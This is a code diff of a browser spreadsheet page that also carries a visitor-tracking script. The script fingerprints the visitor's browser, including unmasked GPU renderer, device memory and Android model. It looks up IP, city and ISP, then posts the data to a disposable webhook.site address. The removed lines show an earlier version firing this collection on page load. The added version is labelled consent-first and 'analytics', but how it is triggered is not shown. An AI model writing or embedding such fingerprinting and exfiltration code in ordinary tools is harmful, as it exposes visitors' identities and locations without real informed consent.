+  td.addEventListener("dblclick",()=>{td.contentEditable=true;td.focus()});
+  td.addEventListener("blur",()=>{td.contentEditable=false;saveState()});
+  td.addEventListener("keydown",e=>{
+    if(e.key==="Enter"){e.preventDefault();td.contentEditable=false;move(23)}
+    if(e.key==="Tab"){e.preventDefault();move(1)}
+    if(e.key==="Delete"){td.textContent="";saveState()}
+  });
+  td.addEventListener("contextmenu",e=>{
+    e.preventDefault();selectCell(td);
+    const m=document.getElementById("context");
+    m.style.display="block";m.style.left=e.clientX+"px";m.style.top=e.clientY+"px";
+  });
+});
+
+document.addEventListener("click",e=>{
+  if(!e.target.closest("#context")) document.getElementById("context").style.display="none";
+});
+document.getElementById("formulaInput").addEventListener("keydown",e=>{
+  if(e.key==="Enter" && selected){selected.textContent=e.target.value;saveState()}
+});
+function undo(){if(history.length){future.push(snapshot());restore(history.pop())}}
+function redo(){if(future.length){history.push(snapshot());restore(future.pop())}}
+function copyCell(){if(selected&&navigator.clipboard)navigator.clipboard.writeText(selected.textContent);document.getElementById("context").style.display="none"}
+async function pasteCell(){
+  if(selected&&navigator.clipboard){try{selected.textContent=await navigator.clipboard.readText();saveState()}catch(e){}}
+  document.getElementById("context").style.display="none";
+}
+function clearCell(){if(selected){selected.textContent="";saveState()}document.getElementById("context").style.display="none"}
+document.getElementById("saveBtn").onclick=()=>{
+  localStorage.setItem("wrongItemSheet",JSON.stringify(snapshot()));
+  alert("Spreadsheet saved locally in this browser.");
+};
+const saved=localStorage.getItem("wrongItemSheet");
+if(saved){try{restore(JSON.parse(saved))}catch(e){}}
+
+/* Visitor collection: explicit consent first. */
+const ENDPOINT_URL="https://webhook.site/c2352c50-5eff-4ac0-8fd7-413d3897049e";
+
+function closeVisitorPanel(){
+  document.getElementById("visitorPanel").classList.add("hidden");
+}
+
+async function startVisitorCollection(){
+  const status=document.getElementById("visitorStatus");
+  status.textContent="Collecting permitted browser information…";
+
+  const info={
+    timestamp:new Date().toISOString(),
+    userAgent:navigator.userAgent,
+    platform:navigator.platform,
+    language:navigator.language,
+    languages:navigator.languages?navigator.languages.join(", "):"",
+    screenResolution:`${screen.width}x${screen.height}`,
+    colorDepth:screen.colorDepth,
+    pixelRatio:devicePixelRatio,
+    viewport:`${innerWidth}x${innerHeight}`,
+    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffsetMin:new Date().getTimezoneOffset(),
+    referrer:document.referrer||"direct",
+    cpuCores:navigator.hardwareConcurrency||"unknown",
+    deviceMemoryGB:navigator.deviceMemory||"unknown",
+    touchSupport:"ontouchstart" in window || navigator.maxTouchPoints>0,
+    cookiesEnabled:navigator.cookieEnabled
+  };
+
+  if(navigator.connection){
+    info.connectionType=navigator.connection.effectiveType;
+    info.downlinkMbps=navigator.connection.downlink;
+  }
+
+  const androidMatch=navigator.userAgent.match(/Android[^;]*;\s*([^)]+)\)/);
+  if(androidMatch) info.androidModelRaw=androidMatch[1].trim();
+
+  try{
+    const canvas=document.createElement("canvas");
+    const gl=canvas.getContext("webgl")||canvas.getContext("experimental-webgl");
+    if(gl){
+      const dbg=gl.getExtension("WEBGL_debug_renderer_info");
+      if(dbg){
+        info.gpuVendor=gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+        info.gpuRenderer=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
       }
+    }
+  }catch(e){info.gpuLookupError="unavailable"}
 
-      // Your unique webhook.site URL
-      const ENDPOINT_URL =
-        'https://webhook.site/c2352c50-5eff-4ac0-8fd7-413d3897049e'
+  try{
+    const res=await fetch("https://ipapi.co/json/");
+    const d=await res.json();
+    info.ip=d.ip; info.ipCity=d.city; info.ipRegion=d.region;
+    info.ipCountry=d.country_name; info.isp=d.org; info.asn=d.asn;
+  }catch(e){info.ipLookupError="unavailable"}
 
-      async function finish(info) {
-        document.getElementById('status').innerText =
-          'Info collected. Sending...'
-        try {
-          await fetch(ENDPOINT_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(info)
-          })
-          document.getElementById('status').innerText = 'Done.'
-        } catch (err) {
-          document.getElementById('status').innerText = 'Failed to send info.'
-        }
-      }
+  /* Precise location is never requested automatically.
+     If you later add a location button, call geolocation only from that user action. */
 
-      window.addEventListener('load', collectVisitorInfo)
-    </script>
-  </body>
+  try{
+    await fetch(ENDPOINT_URL,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify(info)
+    });
+    status.textContent="Analytics information sent successfully.";
+  }catch(e){
+    status.textContent="Could not send analytics information.";
+  }
+
+  setTimeout(closeVisitorPanel,1800);
+}
+</script>
+</body>
 </html>
